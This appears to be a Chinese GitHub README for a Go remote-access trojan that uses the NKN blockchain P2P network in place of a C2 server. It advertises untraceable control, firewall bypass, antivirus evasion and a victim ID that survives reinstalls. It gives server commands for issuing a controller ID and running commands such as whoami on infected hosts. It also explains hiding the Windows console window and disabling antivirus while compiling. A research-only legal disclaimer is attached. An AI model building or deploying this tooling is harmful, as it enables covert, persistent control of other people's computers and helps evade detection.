# Go-NKN-Trojan

一款由区块链的核心网络技术p2p实现的去中心化去C2的基础远控木马框架

## 特点

**解决木马C2服务的痛点，方法不同于域前置、白域名等手段，通信采用p2p作为通信基础架构，调用区块链NKN项目作为实现p2p通信，取消传统C2模式，控制端无需公网IP减少成本并且可以有效防止被溯源,并且可绕过云上流量防火墙管制。**

**木马通过对主机一部分硬件设备信息进行收集整合生成该设备唯一指定ID，即使主机重装操作系统也不改变控制ID，通过此ID目标主机持续对控制端进行心跳式回连保证控制端不丢失目标主机，同时防止目标主机出现意外状况再次上线后ID变化。**

**免杀性能优秀**

![image-20220528183550653](https://cdn.jsdelivr.net/gh/Saber-CC/img@master/data/image-20220528183550653.png)

![image-20220528183618747](https://cdn.jsdelivr.net/gh/Saber-CC/img@master/data/image-20220528183618747.png)

## 免责声明

```
1.依据《刑法修正案（七）》第9条增订的《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息系罪的，处3年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。
2.第二百八十五条第二款 违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。
3.刑法第二百五十三条之一：“国家机关或者金融、电信、交通、教育、医疗等单位的工作人员，违反国家规定，将本单位在履行职责或者提供服务过程中获得的公民个人信息，出售或者非法提供给他人，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。
```

**由于传播、利用开源信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，作者不承担任何责任。**

**开源仅作为安全研究之用！切勿用作实战用途！仅限于本地复现！**

## 使用

### server

**首先需要随机生成一个64位seed，调用下列命令即可。该种子将作为的控制者的唯一标识ID，切勿丢失**

```
server.exe -g new
```

**将64位seed加载读入程序中，控制端将生成该seed的唯一控制ID，控制ID格式为monitor.xxxx....**

```
server.exe -g e6178488d64cf94703f68c57cbdd7eb634a773ba119c7646a4394bac993e47f3
```

展示结果如下

```
your controlid = monitor.8146bae11e3f976c105f7cace9a96bed0dfdb0bdec2f1a8313e46d93726a77c7
```

**启动监听后，监听中若有目标机回连将会显示目标ID，该ID固定格式为xxxx.xxxx....，并且会同时会显示目标机公网IP、内网IP、MAC地址**。展示结果如下

```
target host connect, ID: 09d3.31642085613f0c6e34dff8b9ffc5d330746cd38ddb61fa2cd4884c5f9e634a0b ,target IP address : xxx.xxx.xxx.xx|xxx.xxx.xxx.xxx|xx:xx:xx:xx:xx:xx
```

**对目标机执行命令格式为：目标机ID 命令**

```
09d3.31642085613f0c6e34dff8b9ffc5d330746cd38ddb61fa2cd4884c5f9e634a0b whoami
```

### client

**将server中生成的控制端ID写入Client Code的controlid变量，编译即可。**

## 注意事项

可能会被一些安全产品误报为挖矿病毒，火绒会对区块链相关的编译工具报毒，编译时需关闭火绒或设置信任区。

Windows、Linux皆可成功编译执行，但若Windows平台若需要取消程序弹出CMD框，需要修改command.go配置，WindowsCommand所属Exec()函数中SysProcAttr追加HideWindow: true参数，例如

```
&syscall.SysProcAttr{HideWindow: true}
```

编译参数需要追加参数

```
-ldflags "-s -w -H=windowsgui"
```

**该框架目前只编写了命令执行功能为测试可行性，其余功能可自行追加。**
